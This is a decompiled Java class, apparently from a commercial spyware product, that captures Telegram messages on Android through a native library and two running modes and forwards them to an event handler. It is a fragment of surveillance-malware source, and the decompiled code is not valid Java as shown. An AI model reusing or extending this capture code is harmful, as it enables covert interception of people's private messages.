package com.vvt.capture.telegram;

import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.e;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.telegram.a.d;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
{
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private final String a;
  private com.vvt.base.b d;
  private com.vvt.base.a e;
  private String f;
  private e g;
  private f h;
  
  static
  {
    System.loadLibrary("fxtmessages.8");
  }
  
  public a(String paramString, com.vvt.base.a parama, RunningMode paramRunningMode, com.vvt.n.a.b paramb, Context paramContext, com.vvt.base.b paramb1)
  {
    Object localObject1 = getClass().getSimpleName();
    this.a = ((String)localObject1);
    this.f = paramString;
    this.e = parama;
    this.d = paramb1;
    localObject1 = RunningMode.LIMITED_1;
    Object localObject2;
    if (paramRunningMode == localObject1)
    {
      localObject1 = new com/vvt/capture/telegram/b/a;
      localObject2 = this.d.f();
      ((com.vvt.capture.telegram.b.a)localObject1).<init>(paramb, paramString, (String)localObject2);
      this.g = ((e)localObject1);
      localObject1 = new com/vvt/capture/telegram/b/b;
      localObject2 = this.d;
      ((com.vvt.capture.telegram.b.b)localObject1).<init>(paramString, (com.vvt.base.b)localObject2);
      this.h = ((f)localObject1);
    }
    for (;;)
    {
      return;
      localObject1 = RunningMode.FULL;
      if (paramRunningMode == localObject1)
      {
        localObject1 = new com/vvt/capture/telegram/a/a;
        ((com.vvt.capture.telegram.a.a)localObject1).<init>();
        this.g = ((e)localObject1);
        localObject1 = new com/vvt/capture/telegram/a/d;
        localObject2 = this.d;
        ((d)localObject1).<init>(paramString, (com.vvt.base.b)localObject2);
        this.h = ((f)localObject1);
      }
      else
      {
        boolean bool = c;
        if (!bool) {}
      }
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  public void a(com.vvt.base.b paramb)
  {
    this.d = paramb;
    boolean bool = b;
    if (bool) {}
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = b;
    if (bool1) {}
    Iterator localIterator = paramList.iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = localIterator.next();
      boolean bool2 = localObject instanceof TelegramData;
      if (bool2)
      {
        bool2 = b;
        if (bool2) {}
        localObject = b.a((TelegramData)localObject);
        if (localObject != null)
        {
          int i = ((List)localObject).size();
          if (i > 0) {
            localArrayList.addAll((Collection)localObject);
          }
        }
      }
    }
    Object localObject = this.e;
    if (localObject != null)
    {
      bool1 = k();
      if (bool1)
      {
        bool1 = b;
        if (bool1) {}
        localObject = this.e;
        ((com.vvt.base.a)localObject).a(localArrayList);
      }
    }
  }
  
  protected e b()
  {
    return this.g;
  }
  
  protected f c()
  {
    return this.h;
  }
  
  protected String d()
  {
    return this.a;
  }
  
  protected String e()
  {
    return this.f;
  }
  
  protected String f()
  {
    return "telegram.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */